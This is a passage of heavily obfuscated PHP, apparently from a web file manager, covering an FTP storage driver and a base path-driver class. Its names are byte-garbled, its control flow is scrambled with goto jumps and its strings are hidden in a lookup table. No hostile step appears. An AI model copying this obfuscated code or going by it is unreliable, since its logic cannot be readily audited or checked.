!1; } $c»ÚòÏ¤Ï† = $this->iconvSystem($c»ÚòÏ¤Ï†); $Dƒ¹—¸ÔÅ¹ = $this->ftpList($c»ÚòÏ¤Ï†); if (!$Dƒ¹—¸ÔÅ¹) { return @ftp_rmdir($this->connect, $c»ÚòÏ¤Ï†); } foreach ($Dƒ¹—¸ÔÅ¹ as $A†ÌÅ·¾·®) { if ($this->isFolder($A†ÌÅ·¾·®)) { $A†ÌÅ·¾·® = $this->iconvApp($A†ÌÅ·¾·®); $this->delFolder($A†ÌÅ·¾·®); } else { @ftp_delete($this->connect, $A†ÌÅ·¾·®); } } return @ftp_rmdir($this->connect, $c»ÚòÏ¤Ï†); } public function rename($bÃÜ·ÀÆ´, $D•œ÷ëô«) { goto C ”šà†Æ; C†ÊàÔØ„: return $a§Õ¬ªËİŸ ? $this->getPathOuter($e‚é„¯×î) : !1; goto d¬à…ªÄÖ®; e™†¡«˜‰¬: $e‚é„¯×î = rtrim($aï÷Ó¡“»¡, $D›…‘·Û©ï[8]) . $D›…‘·Û©ï[8] . $dÓîÏå¬Ğé; $a§Õ¬ªËİŸ = @ftp_rename($this->connect, $bÃÜ·ÀÆ´, $e‚é„¯×î); $e‚é„¯×î = $this->iconvApp($e‚é„¯×î); goto C†ÊàÔØ„; C ”šà†Æ: $D›…‘·Û©ï =& $_SERVER[‘®…¢À]; if (!$this->_isconn()) { return !1; } $dÓîÏå¬Ğé = $this->fileNameAuto($this->pathFather($bÃÜ·ÀÆ´), $D•œ÷ëô«); goto a’Ê¹Œƒ†; a’Ê¹Œƒ†: $dÓîÏå¬Ğé = $this->iconvSystem($dÓîÏå¬Ğé); $bÃÜ·ÀÆ´ = $this->iconvSystem($bÃÜ·ÀÆ´); $aï÷Ó¡“»¡ = $this->pathFather($bÃÜ·ÀÆ´); goto e™†¡«˜‰¬; d¬à…ªÄÖ®: } private function folderInfo($aŠ‰Çå§å, $f…ÂˆÄ† = false) { goto BÛçæî©ñ†; E½áé¸’æ: return $bÈ·³¬……±; goto e·£µ“á¤È; bæ¾“ÓéŞ: $D¬œŠÍã´ = $this->iconvSystem($aŠ‰Çå§å); if ($f…ÂˆÄ†) { return array($bã¯Üõ‘‘»[28] => $C ë˜ïÛÕ, $bã¯Üõ‘‘»[76] => $eùœçºà­«, $bã¯Üõ‘‘»[29] => $bã¯Üõ‘‘»[77]); } $bÈ·³¬……± = array($bã¯Üõ‘‘»[28] => $C ë˜ïÛÕ, $bã¯Üõ‘‘»[76] => $eùœçºà­«, $bã¯Üõ‘‘»[29] => $bã¯Üõ‘‘»[77], $bã¯Üõ‘‘»[184] => 0, $bã¯Üõ‘‘»[108] => 0, $bã¯Üõ‘‘»[1112] => !0, $bã¯Üõ‘‘»[1113] => !0); goto E½áé¸’æ; BÛçæî©ñ†: $bã¯Üõ‘‘» =& $_SERVER[‘®…¢À]; $eùœçºà­« = $this->getPathOuter(rtrim($aŠ‰Çå§å, $bã¯Üõ‘‘»[8])); $C ë˜ïÛÕ = $this->pathThis($eùœçºà­«); goto bæ¾“ÓéŞ; e·£µ“á¤È: } private function fileInfo($b¨ åÕÃø‚, $f¶İ‘Â²Ï = false) { goto bÉÀøĞÓµİ; FÆ±Ûàîô: $f»„å¸…ù” = $this->iconvSystem($b¨ åÕÃø‚); if ($f¶İ‘Â²Ï) { return array($cˆ»Š©µé˜[28] => $FÌ÷ĞâØ, $cˆ»Š©µé˜[76] => $BØÄÄ Èì½, $cˆ»Š©µé˜[29] => $cˆ»Š©µé˜[164], $cˆ»Š©µé˜[157] => $this->ext($b¨ åÕÃø‚), $cˆ»Š©µé˜[78] => $this->size($b¨ åÕÃø‚)); } $D¥Áîİ¿¾í = array($cˆ»Š©µé˜[28] => $FÌ÷ĞâØ, $cˆ»Š©µé˜[76] => $BØÄÄ Èì½, $cˆ»Š©µé˜[29] => $cˆ»Š©µé˜[164], $cˆ»Š©µé˜[184] => 0, $cˆ»Š©µé˜[108] => @ftp_mdtm($this->connect, $f»„å¸…ù”), $cˆ»Š©µé˜[157] => $this->ext($b¨ åÕÃø‚), $cˆ»Š©µé˜[78] => $this->size($b¨ åÕÃø‚), $cˆ»Š©µé˜[1112] => !0, $cˆ»Š©µé˜[1113] => !0); goto F¿ŸâÜÊš; F¿ŸâÜÊš: $D¥Áîİ¿¾í[$cˆ»Š©µé˜[108]] = $D¥Áîİ¿¾í[$cˆ»Š©µé˜[108]] > 0 ? $D¥Áîİ¿¾í[$cˆ»Š©µé˜[108]] : 0; return $D¥Áîİ¿¾í; goto e¾˜Ûå°¼›; bÉÀøĞÓµİ: $cˆ»Š©µé˜ =& $_SERVER[‘®…¢À]; $BØÄÄ Èì½ = $this->getPathOuter(rtrim($b¨ åÕÃø‚, $cˆ»Š©µé˜[8])); $FÌ÷ĞâØ = $this->pathThis($BØÄÄ Èì½); goto FÆ±Ûàîô; e¾˜Ûå°¼›: } public function size($FÙÖŞŒ‡‡) { $føƒõ¼øŒÆ = $this->objectMeta($FÙÖŞŒ‡‡); return $føƒõ¼øŒÆ ? $føƒõ¼øŒÆ[$_SERVER[‘®…¢À][78]] : 0; } public function info($c¾Œ°²÷ñ) { if ($this->isFile($c¾Œ°²÷ñ)) { return $this->fileInfo($c¾Œ°²÷ñ, 0); } else { if ($this->isFolder($c¾Œ°²÷ñ)) { return $this->folderInfo($c¾Œ°²÷ñ); } } return !1; } public function exist($E”àÉâä„¢) { return $this->objectMeta($E”àÉâä„¢) ? !0 : !1; } public function isFile($a³‡™Ä) { $bÀÖÚ½Îó² =& $_SERVER[‘®…¢À]; $a¶†Ëç°´§ = $this->objectMeta($a³‡™Ä); return $a¶†Ëç°´§ ? $a¶†Ëç°´§[$bÀÖÚ½Îó²[29]] == $bÀÖÚ½Îó²[164] : !1; } public function isFolder($dºç‹—öå) { $AçĞˆ„Èª =& $_SERVER[‘®…¢À]; $c·‹ËŞçé‘ = $this->objectMeta($dºç‹—öå); return $c·‹ËŞçé‘ ? $c·‹ËŞçé‘[$AçĞˆ„Èª[29]] == $AçĞˆ„Èª[77] : !1; } public function listPath($dÙ©¦‚‘Ö², $EÍ‡¢§‘©œ = false) { goto a¥«–ÉŞÀÚ; a¢·ÔÆº‰í: foreach ($F‹ªî«Èšê as $dÙ©¦‚‘Ö²) { if ($this->isFolder($dÙ©¦‚‘Ö²)) { $Eé«ºã­«[$d„Ìéİíï³[75]][] = $this->folderInfo($dÙ©¦‚‘Ö², $EÍ‡¢§‘©œ); } else { $Eé«ºã­«[$d„Ìéİíï³[74]][] = $this->fileInfo($dÙ©¦‚‘Ö², $EÍ‡¢§‘©œ); } } return $Eé«ºã­«; goto a×‹“œ­Åâ; BœË¾ˆ·Òœ: $F‹ªî«Èšê = $this->ftpList($dÙ©¦‚‘Ö²); $Eé«ºã­« = array($d„Ìéİíï³[75] => array(), $d„Ìéİíï³[74] => array()); if (!$F‹ªî«Èšê) { return $Eé«ºã­«; } goto a¢·ÔÆº‰í; a¥«–ÉŞÀÚ: $d„Ìéİíï³ =& $_SERVER[‘®…¢À]; if (!$this->_isconn()) { return !1; } $dÙ©¦‚‘Ö² = $this->iconvSystem($dÙ©¦‚‘Ö²); goto BœË¾ˆ·Òœ; a×‹“œ­Åâ: } public function has($bõ›ìšÚºö, $AßİÆ‹—‰ = false, $FƒÔ²ó½ = true) { goto eÊ‘ “Ø’•; eÊ‘ “Ø’•: $e·–ç’øƒ =& $_SERVER[‘®…¢À]; if (!$this->_isconn()) { return !1; } $bõ›ìšÚºö = $this->iconvSystem($bõ›ìšÚºö); goto døÜ—„¢î; døÜ—„¢î: $A‰Û‚ßç° = $this->ftpList($bõ›ìšÚºö); if (!$A‰Û‚ßç°) { return !1; } if ($AßİÆ‹—‰) { return array($e·–ç’øƒ[188] => 0, $e·–ç’øƒ[189] => count($A‰Û‚ßç°)); } goto eÂÃĞ×•; eÂÃĞ×•: foreach ($A‰Û‚ßç° as $bõ›ìšÚºö) { if ($FƒÔ²ó½) { if (!$this->isFolder($bõ›ìšÚºö)) { return !0; } } else { if ($this->isFolder($bõ›ìšÚºö)) { return !0; } } } return !1; goto EÒ¯±ÓÖÇ; EÒ¯±ÓÖÇ: } public function listAll($bÌ§áäéÑ) { goto f¨éë–ë; CåÍ†•ŒÃƒ: foreach ($cì”Æ«óÖ[$f©†ğÉ–²[75]] as $e÷»‡ØÍ«Ğ) { $d¡…¡æ¦±[] = array($f©†ğÉ–²[76] => $f©†ğÉ–²[8] . trim(str_replace($bÌ§áäéÑ, $f©†ğÉ–²[33], $e÷»‡ØÍ«Ğ), $f©†ğÉ–²[8]) . $f©†ğÉ–²[8], $f©†ğÉ–²[77] => 1, $f©†ğÉ–²[78] => 0); } foreach ($cì”Æ«óÖ[$f©†ğÉ–²[74]] as $cí“‹Š‡¢) { $d¡…¡æ¦±[] = array($f©†ğÉ–²[76] => $f©†ğÉ–²[8] . trim(str_replace($bÌ§áäéÑ, $f©†ğÉ–²[33], $cí“‹Š‡¢), $f©†ğÉ–²[8]), $f©†ğÉ–²[77] => 0, $f©†ğÉ–²[78] => $this->size($cí“‹Š‡¢)); } return $d¡…¡æ¦±; goto C•ŒªÖ; c£¹Òö«öÚ: $cì”Æ«óÖ = array($f©†ğÉ–²[74] => array(), $f©†ğÉ–²[75] => array()); $this->recursionFtpFiles($bÌ§áäéÑ, $cì”Æ«óÖ); $d¡…¡æ¦± = array(); goto CåÍ†•ŒÃƒ; f¨éë–ë: $f©†ğÉ–² =& $_SERVER[‘®…¢À]; if (!$this->_isconn()) { return !1; } $bÌ§áäéÑ = $this->iconvSystem($bÌ§áäéÑ); goto c£¹Òö«öÚ; C•ŒªÖ: } public function getContent($d…¬ŠˆáÒ³) { if (!$this->_isconn()) { return !1; } $d…¬ŠˆáÒ³ = $this->iconvSystem($d…¬ŠˆáÒ³); return $this->fileSubstr($d…¬ŠˆáÒ³); } public function setContent($CÂ¡ÊØ¢Â¯, $dóõ‡³½¿ = '') { goto FºçÉÆÇõ×; Bêé½èŒ: file_put_contents($f‰’ÎÇÈ¬, $dóõ‡³½¿); $aåâ®«Œ‡³ = $this->upload($CÂ¡ÊØ¢Â¯, $this->iconvApp($f‰’ÎÇÈ¬)); $this->tempFileRemve($f‰’ÎÇÈ¬); goto e°Šİ’…ó¥; FºçÉÆÇõ×: if (!$this->_isconn()) { return !1; } $b´ÕÚîï¯ = $this->pathThis($this->iconvSystem($CÂ¡ÊØ¢Â¯)); $f‰’ÎÇÈ¬ = $this->tempFile($b´ÕÚîï¯); goto Bêé½èŒ; e°Šİ’…ó¥: return $aåâ®«Œ‡³; goto eŸ¼ªö©; eŸ¼ªö©: } public function fileSubstr($AÅˆÛ»µªÁ, $Dè¢”¦ğÆí = 0, $EÙªãó¢ìÁ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($AÅˆÛ»µªÁ, $Dè¢”¦ğÆí, $EÙªãó¢ìÁ); } private function ftpRequest($c™ØŠ»–ù¶, $c¾ĞÀÔ‰†ù = 0, $bÙ¼Ê‚ë‘· = false) { goto C”Ä×²İí; a¥Ú†ìÜ: return $D„ØùŠÑò¯; goto F›Û„ÆÍ; AÉİ–•«ÍÇ: curl_setopt($D…Î×Ñã†, CURLOPT_URL, $a«ŒèéÙó . $this->pathEncode($c™ØŠ»–ù¶)); curl_setopt($D…Î×Ñã†, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($bÙ¼Ê‚ë‘·) { $f§ãÃÍ²ò = $c¾ĞÀÔ‰†ù + $bÙ¼Ê‚ë‘· - 1; curl_setopt($D…Î×Ñã†, CURLOPT_RANGE, "{$c¾ĞÀÔ‰†ù}\55{$f§ãÃÍ²ò}"); } goto fºÆíñ„ŸÇ; fºÆíñ„ŸÇ: curl_setopt($D…Î×Ñã†, CURLOPT_RETURNTRANSFER, 1); $D„ØùŠÑò¯ = curl_exec($D…Î×Ñã†); curl_close($D…Î×Ñã†); goto a¥Ú†ìÜ; C”Ä×²İí: $c™ØŠ»–ù¶ = $this->iconvSystem($c™ØŠ»–ù¶); $a«ŒèéÙó = $this->scheme . $this->host . $_SERVER[‘®…¢À][4] . $this->port; $D…Î×Ñã† = curl_init(); goto AÉİ–•«ÍÇ; F›Û„ÆÍ: } public function upload($aÅ¸³Òé„Ë, $B³í‚¯æ¹¦, $cİ—”¤ˆŒ = false, $cÆáù×¶Ç = REPEAT_REPLACE) { goto CùÉ±¥ÑÚå; Dˆ¸‚„‚¼ø: if ($E†…¿¿Ù¾ != FTP_FINISHED) { return !1; } return $this->getPathOuter($aÅ¸³Òé„Ë); goto D®Ùø½å”; E”ÚØ¹†: $B³í‚¯æ¹¦ = $this->iconvSystem($B³í‚¯æ¹¦); $E†…¿¿Ù¾ = ftp_nb_put($this->connect, $aÅ¸³Òé„Ë, $B³í‚¯æ¹¦, FTP_BINARY); while ($E†…¿¿Ù¾ == FTP_MOREDATA) { $E†…¿¿Ù¾ = ftp_nb_continue($this->connect); } goto Dˆ¸‚„‚¼ø; CùÉ±¥ÑÚå: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($aÅ¸³Òé„Ë))) { return !1; } $aÅ¸³Òé„Ë = $this->iconvSystem($aÅ¸³Òé„Ë); goto E”ÚØ¹†; D®Ùø½å”: } public function download($aéŸˆõ¡², $cç©´¤ßš = '') { goto FÏÏ…’Œ‹Œ; FÏÏ…’Œ‹Œ: if (!$this->_isconn()) { return !1; } $F¶ÑÄõ = $this->pathFather($cç©´¤ßš); if (!IO::mkdir($F¶ÑÄõ)) { return !1; } goto A…‘ÂÂ±ø¥; d‚Œ‡ãñ†¤: while ($e«ÁŒìä–ª == FTP_MOREDATA) { $e«ÁŒìä–ª = ftp_nb_continue($this->connect); } if ($e«ÁŒìä–ª != FTP_FINISHED) { return !1; } return $this->iconvApp($cç©´¤ßš); goto c™Õ¾ç¸›ê; A…‘ÂÂ±ø¥: $aéŸˆõ¡² = $this->iconvSystem($aéŸˆõ¡²); $cç©´¤ßš = $this->iconvSystem($cç©´¤ßš); $e«ÁŒìä–ª = ftp_nb_get($this->connect, $cç©´¤ßš, $aéŸˆõ¡², FTP_BINARY); goto d‚Œ‡ãñ†¤; c™Õ¾ç¸›ê: } private function ftpList($A×ÂİĞ„éŠ) { goto A†¡°ãÔÎÌ; bÕÑöÁù±: $dÈàç¥ôñê = array(); foreach ($e†Ë·ºõãÊ as $f…Í¸’Ô·á) { if ($f…Í¸’Ô·á == $a¾­†œ½‚š[94] || $f…Í¸’Ô·á == $a¾­†œ½‚š[1115]) { continue; } if (!strstr($f…Í¸’Ô·á, $a¾­†œ½‚š[8])) { $f…Í¸’Ô·á = $A×ÂİĞ„éŠ . ltrim($f…Í¸’Ô·á, $a¾­†œ½‚š[8]); } $dÈàç¥ôñê[] = $this->iconvApp($f…Í¸’Ô·á); } return $dÈàç¥ôñê; goto c×öõ‘¿õô; A†¡°ãÔÎÌ: $a¾­†œ½‚š =& $_SERVER[‘®…¢À]; if (!$this->isFolder($A×ÂİĞ„éŠ)) { return !1; } @ftp_chdir($this->connect, $a¾­†œ½‚š[8]); goto fó¶Ê©æœø; fó¶Ê©æœø: $A×ÂİĞ„éŠ = rtrim($A×ÂİĞ„éŠ, $a¾­†œ½‚š[8]) . $a¾­†œ½‚š[8]; $e†Ë·ºõãÊ = @ftp_nlist($this->connect, $A×ÂİĞ„éŠ); if ($e†Ë·ºõãÊ === !1) { $e†Ë·ºõãÊ = @ftp_rawlist($this->connect, $A×ÂİĞ„éŠ); foreach ($e†Ë·ºõãÊ as $Bõ²‚š±ù· => $aÑÓ Ìèç) { $e†Ë·ºõãÊ[$Bõ²‚š±ù·] = end(explode($a¾­†œ½‚š[1114], $aÑÓ Ìèç)); } } goto bÕÑöÁù±; c×öõ‘¿õô: } private function recursionFtpFiles($F×Ï†¸‹äà, &$Dİ„·É¼ô) { $a°ÃñªÕ«º =& $_SERVER[‘®…¢À]; if (!$this->_isconn()) { return !1; } if (!($fºßï·ê‡Î = $this->ftpList($F×Ï†¸‹äà))) { return !1; } foreach ($fºßï·ê‡Î as $F×Ï†¸‹äà) { if ($this->isFolder($F×Ï†¸‹äà)) { $this->recursionFtpFiles($F×Ï†¸‹äà, $Dİ„·É¼ô); $Dİ„·É¼ô[$a°ÃñªÕ«º[75]][] = $F×Ï†¸‹äà; } else { $Dİ„·É¼ô[$a°ÃñªÕ«º[74]][] = $F×Ï†¸‹äà; } } } private function objectMeta($fğƒ÷šÁŠ) { goto FË™­¬‚ÎÅ; cîïª°¬¢: return $Aù®¾èêÏ‘; goto dªÍËê¨Ù; FË™­¬‚ÎÅ: $e»ÈïçŸŒ =& $_SERVER[‘®…¢À]; $A“óçÊ¤ñ = $e»ÈïçŸŒ[1116] . md5($fğƒ÷šÁŠ); $Aù®¾èêÏ‘ = Cache::get($A“óçÊ¤ñ); goto dÅÜ•¯ššÖ; FÜ¹¿”½İ‚: $b“‰ …œ¨» = @ftp_size($this->connect, $this->iconvSystem($fğƒ÷šÁŠ)); if ($b“‰ …œ¨» != -1) { $Aù®¾èêÏ‘ = array($e»ÈïçŸŒ[78] => $b“‰ …œ¨», $e»ÈïçŸŒ[29] => $e»ÈïçŸŒ[164]); } else { $B¥ß’‘”’„ = @ftp_chdir($this->connect, $this->iconvSystem($fğƒ÷šÁŠ)); $Aù®¾èêÏ‘ = $B¥ß’‘”’„ ? array($e»ÈïçŸŒ[78] => 0, $e»ÈïçŸŒ[29] => $e»ÈïçŸŒ[77]) : !1; } Cache::set($A“óçÊ¤ñ, $Aù®¾èêÏ‘, 0); goto cîïª°¬¢; dÅÜ•¯ššÖ: if ($Aù®¾èêÏ‘ !== null && $Aù®¾èêÏ‘ !== !1) { return $Aù®¾èêÏ‘; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $e»ÈïçŸŒ[8]); goto FÜ¹¿”½İ‚; dªÍËê¨Ù: } } goto D“¡ßöØ±²; a°Ü–í ¯¿: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $dœ†»•×¬® =& $_SERVER[‘®…¢À]; $this->objectDriver = array($dœ†»•×¬®[57], $dœ†»•×¬®[58], $dœ†»•×¬®[59], $dœ†»•×¬®[60], $dœ†»•×¬®[61], $dœ†»•×¬®[62], $dœ†»•×¬®[63], $dœ†»•×¬®[64], $dœ†»•×¬®[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($DÚâƒØÙò¬) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($DÚâƒØÙò¬, $_SERVER[‘®…¢À][8]); } return $DÚâƒØÙò¬; } public function getPathName($a¼À„“İßó) { return $a¼À„“İßó; } public function iconvApp($F‚ê­¸ÊÌ) { return $F‚ê­¸ÊÌ; } public function iconvSystem($Dîƒé„¶¯‘) { return $Dîƒé„¶¯‘; } public function iconvTo($cà“ßœğ‡¢, $dëÌÁµø, $dä‘ØİåÌ) { goto cÅ‚å¦Á¤ù; B Ã‘öÄ÷‰: $b«Ÿçº©¤Ş = $b«Ÿçº©¤Ş ? $b«Ÿçº©¤Ş : $cà“ßœğ‡¢; if (strstr($b«Ÿçº©¤Ş, $cø¾Ù‘Æ¦´[70])) { $b«Ÿçº©¤Ş = str_replace($cø¾Ù‘Æ¦´[70], $cø¾Ù‘Æ¦´[71], $b«Ÿçº©¤Ş); } $BÉ‰¿ç©»Ğ[$dëÌÁµø . $cø¾Ù‘Æ¦´[67] . $dä‘ØİåÌ . $cø¾Ù‘Æ¦´[68] . $cà“ßœğ‡¢] = $b«Ÿçº©¤Ş; goto AÈ·Ö¦»Óˆ; AÈ·Ö¦»Óˆ: $BÉ‰¿ç©»Ğ[$dä‘ØİåÌ . $cø¾Ù‘Æ¦´[67] . $dëÌÁµø . $cø¾Ù‘Æ¦´[68] . $cà“ßœğ‡¢] = $cà“ßœğ‡¢; $BÉ‰¿ç©»Ğ[$dä‘ØİåÌ . $cø¾Ù‘Æ¦´[67] . $dëÌÁµø . $cø¾Ù‘Æ¦´[68] . $b«Ÿçº©¤Ş] = $cà“ßœğ‡¢; $BÉ‰¿ç©»Ğ[$dëÌÁµø . $cø¾Ù‘Æ¦´[67] . $dä‘ØİåÌ . $cø¾Ù‘Æ¦´[68] . $b«Ÿçº©¤Ş] = $b«Ÿçº©¤Ş; goto Eª„ØÜˆ”š; AÀ®‚òøÆ: $b˜‡¡Üòí¯ = $dëÌÁµø . $cø¾Ù‘Æ¦´[67] . $dä‘ØİåÌ . $cø¾Ù‘Æ¦´[68] . $cà“ßœğ‡¢; if (isset($BÉ‰¿ç©»Ğ[$b˜‡¡Üòí¯])) { return $BÉ‰¿ç©»Ğ[$b˜‡¡Üòí¯]; } if (function_exists($cø¾Ù‘Æ¦´[69])) { $b«Ÿçº©¤Ş = @mb_convert_encoding($cà“ßœğ‡¢, $dä‘ØİåÌ, $dëÌÁµø); } else { $b«Ÿçº©¤Ş = @iconv($dëÌÁµø, $dä‘ØİåÌ, $cà“ßœğ‡¢); } goto B Ã‘öÄ÷‰; Eª„ØÜˆ”š: return $b«Ÿçº©¤Ş; goto dÚ²ñ–Ñ¿; cÅ‚å¦Á¤ù: $cø¾Ù‘Æ¦´ =& $_SERVER[‘®…¢À]; if (!$cà“ßœğ‡¢ || !function_exists($cø¾Ù‘Æ¦´[66])) { return $cà“ßœğ‡¢; } static $BÉ‰¿ç©»Ğ = array(); goto AÀ®‚òøÆ; dÚ²ñ–Ñ¿: } public function getPathInner($D¿Ëê‹ä”ù) { $fåê êÊ = IO::init($D¿Ëê‹ä”ù); return $fåê êÊ->path; } public function getPathOuter($b½õ‹ÓÌ©») { $Eˆºõ”÷‡† =& $_SERVER[‘®…¢À]; $FÅ†²ÉÌº = strlen(trim($this->pathBase, $Eˆºõ”÷‡†[8])); $b½õ‹ÓÌ©» = substr(trim($b½õ‹ÓÌ©», $Eˆºõ”÷‡†[8]), $FÅ†²ÉÌº); return $this->pathDriver . $Eˆºõ”÷‡†[8] . ltrim($b½õ‹ÓÌ©», $Eˆºõ”÷‡†[8]); } public function isParentOf($CˆÔ÷¬â¡§, $c„Ê°·‰¬Í) { $AÍˆÒƒÚ´Œ =& $_SERVER[‘®…¢À]; $CˆÔ÷¬â¡§ = rtrim(strtolower($CˆÔ÷¬â¡§), $AÍˆÒƒÚ´Œ[8]) . $AÍˆÒƒÚ´Œ[8]; $c„Ê°·‰¬Í = rtrim(strtolower($c„Ê°·‰¬Í), $AÍˆÒƒÚ´Œ[8]) . $AÍˆÒƒÚ´Œ[8]; $CùàŠ¬®¢İ = strpos($c„Ê°·‰¬Í, $CˆÔ÷¬â¡§) === 0; return $CùàŠ¬®¢İ; } public function getType() { $a¬›Ñ«ãƒÉ =& $_SERVER[‘®…¢À]; $F»¢êåĞâ² = str_replace($a¬›Ñ«ãƒÉ[72], $a¬›Ñ«ãƒÉ[33], get_class($this)); return strtolower($F»¢êåĞâ²); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($D®›ê–Öè‘, $B„œùÀà¼) { $e˜ç’äÌ˜ğ =& $_SERVER[‘®…¢À]; $aÖ¶Û Ìå = rtrim($D®›ê–Öè‘, $e˜ç’äÌ˜ğ[8]) . $e˜ç’äÌ˜ğ[8] . $B„œùÀà¼; $E¦¡¶õ”» = $this->exist($aÖ¶Û Ìå); return $E¦¡¶õ”» ? $aÖ¶Û Ìå : !1; } public function renameObject($CñÌ…À‘ƒë, $bÑØ»ØÎ½ä) { goto EŒÌ„ŠÍ­‹; DÆ‡÷öÌè: return $CŸ±ä„ùƒ³ ? $bÑØ»ØÎ½ä : !1; goto bÁì„æÑÑ; BáÎ›ù¹¢š: $CñÌ…À‘ƒë = $this->getPathOuter($CñÌ…À‘ƒë); $bÑØ»ØÎ½ä = $this->pathFather($CñÌ…À‘ƒë) . $bÑØ»ØÎ½ä; if (IO::isFile($CñÌ…À‘ƒë)) { $CŸ±ä„ùƒ³ = IO::copy($CñÌ…À‘ƒë, $this->pathFather($CñÌ…À‘ƒë), REPEAT_RENAME_FOLDER, $Aœ§ˆ…±¼†); if ($CŸ±ä„ùƒ³) { IO::remove($CñÌ…À‘ƒë); } } else { $CŸ±ä„ùƒ³ = IO::mkdir($bÑØ»ØÎ½ä); if (!$CŸ±ä„ùƒ³) { return !1; } $f–­‚†È© = IO::listPath($CñÌ…À‘ƒë, !0); $d‚„Òêœ¤ì = array_merge($f–­‚†È©[$AîÎë¶¶ğ§[74]], $f–­‚†È©[$AîÎë¶¶ğ§[75]]); foreach ($d‚„Òêœ¤ì as $Fƒé÷Í©) { IO::move($Fƒé÷Í©[$AîÎë¶¶ğ§[76]], $bÑØ»ØÎ½ä, REPEAT_RENAME_FOLDER); } IO::remove($CñÌ…À‘ƒë); } goto DÆ‡÷öÌè; EŒÌ„ŠÍ­‹: $AîÎë¶¶ğ§ =& $_SERVER[‘®…¢À]; $Aœ§ˆ…±¼† = $bÑØ»ØÎ½ä; Hook::trigger($AîÎë¶¶ğ§[73], $this, $CñÌ…À‘ƒë, $this, $this->pathFather($CñÌ…À‘ƒë) . $bÑØ»ØÎ½ä); goto BáÎ›ù¹¢š; bÁì„æÑÑ: } public function tempFile($D¦Şœ†°Şç = '', $d¹ÖºÁ¤š§ = '') { goto a›‹ò­Ë÷; a›‹ò­Ë÷: if (!$D¦Şœ†°Şç) { $D¦Şœ†°Şç = rand_string(15); } $E¦î”‹—…Š = TEMP_FILES . rand_string(15) . $_SERVER[‘®…¢À][8]; @mkdir($E¦î”‹—…Š, 511, !0); goto D”‚ÉÉÒËæ; FÀó¥éâÖ»: return $a’ï²º†Æ; goto föß‘™ğ¤Î; D”‚ÉÉÒËæ: $a’ï²º†Æ = $E¦î”‹—…Š . $D¦Şœ†°Şç; @touch($a’ï²º†Æ); if ($d¹ÖºÁ¤š§) { file_put_contents($a’ï²º†Æ, $d¹ÖºÁ¤š§); } goto FÀó¥éâÖ»; föß‘™ğ¤Î: } public function tempFileRemve($fù •ÍÄ¡º) { @unlink($fù •ÍÄ¡º); @rmdir($this->pathFather($fù •ÍÄ¡º)); } public function mkfile($Fò˜ğ¢ŒŞ™, $fæó¦‰³› = '', $eáÂÄïˆ‹ = REPEAT_RENAME) { } public function mkdir($EùğÕàô , $E†ë»âÏøò = REPEAT_SKIP) { } public function copyFile($CÑòÃ¶½ªª, $F™ğˆòÜÕ×) { } public function moveFile($c ĞÆ´öÅÁ, $fÅ‘Ü©å‘÷) { } public function remove($C¸ØˆÉôÊì) { if ($this->isFile($C¸ØˆÉôÊì)) { return $this->delFile($C¸ØˆÉôÊì); } return $this->delFolder($C¸ØˆÉôÊì); } public function rename($CÛÉíçìõà, $F¸ÇóÑ½³) { } public function exist($A–‹áè·ô) { } public function findByHash($DÄŒ¬Ëé‡ = '', $C»óÑÈºø = '') { return !1; } public function isFile($fµÓàÈÖÆ) { } public function isFolder($Cô÷êšé›–) { } public function size($aøƒ±“÷´’) { } public function info($C¸ÕµİÕõ) { } public function infoSimple($fƒŒñƒ¤‚Œ) { return $this->info($fƒŒñƒ¤‚Œ); } public function infoAuth($dª¯˜ÙîÃ) { return $this->info($dª¯˜ÙîÃ); } public function infoFull($fÂ‡ªÏËÑË) { return $this->info($fÂ‡ªÏËÑË); } public function infoWithChildren($cªœî¿¶ó) { $CáÛµ“Ó»Ô =& $_SERVER[‘®…¢À]; $e‹Ò¶Ù÷Ëƒ = $this->info($cªœî¿¶ó); if ($e‹Ò¶Ù÷Ëƒ && $e‹Ò¶Ù÷Ëƒ[$CáÛµ“Ó»Ô[29]] == $CáÛµ“Ó»Ô[77]) { $eßÏì…ğº = array($CáÛµ“Ó»Ô[78] => 0, $CáÛµ“Ó»Ô[79] => 0, $CáÛµ“Ó»Ô[80] => 0); $this->infoChildren($cªœî¿¶ó, $eßÏì…ğº); $e‹Ò¶Ù÷Ëƒ[$CáÛµ“Ó»Ô[78]] = $eßÏì…ğº[$CáÛµ“Ó»Ô[78]]; $e‹Ò¶Ù÷Ëƒ[$CáÛµ“Ó»Ô[81]] = array($CáÛµ“Ó»Ô[82] => $eßÏì…ğº[$CáÛµ“Ó»Ô[79]], $CáÛµ“Ó»Ô[83] => $eßÏì…ğº[$CáÛµ“Ó»Ô[80]]); } return $e‹Ò¶Ù÷Ëƒ; } public function listPath($c¼­…©¥, $a±âº‘©‚ = false) { } public function has($cºÄå«¢‘×, $C‹­Â‚ˆÍº = false, $aÍ‰“ƒ¼‹÷ = false) { } public function canRead($e™½‘¾¯Üø) { } public function canWrite($bëÍ¸î¤) { } public function getContent($eğ¯Ë˜­¬¥) { } public function setContent($d‰ÓÒÌâ°, $BåÔ›±ÎĞ = '') { } protected function infoChildren($FˆñƒÅÅ¶Ò, &$cÖÌÙ‘«Œ‡) { $bÂöºÅ—¯ =& $_SERVER[‘®…¢À]; check_abort(); $Eğ¤ìÜÒ¼° = $this->listPath($FˆñƒÅÅ¶Ò, !0); $Eğ¤ìÜÒ¼° = array_merge($Eğ¤ìÜÒ¼°[$bÂöºÅ—¯[75]], $Eğ¤ìÜÒ¼°[$bÂöºÅ—¯[74]]); foreach ($Eğ¤ìÜÒ¼° as $f¬ƒ÷¬ç) { if ($f¬ƒ÷¬ç[$bÂöºÅ—¯[29]] == $bÂöºÅ—¯[77]) { $cÖÌÙ‘«Œ‡[$bÂöºÅ—¯[80]]++; $CÄàœ­±Õ” = $this->getPathInner($f¬ƒ÷¬ç[$bÂöºÅ—¯[76]]); $this->infoChildren($CÄàœ­±Õ”, $cÖÌÙ‘«Œ‡); } else { $cÖÌÙ‘«Œ‡[$bÂöºÅ—¯[79]]++; 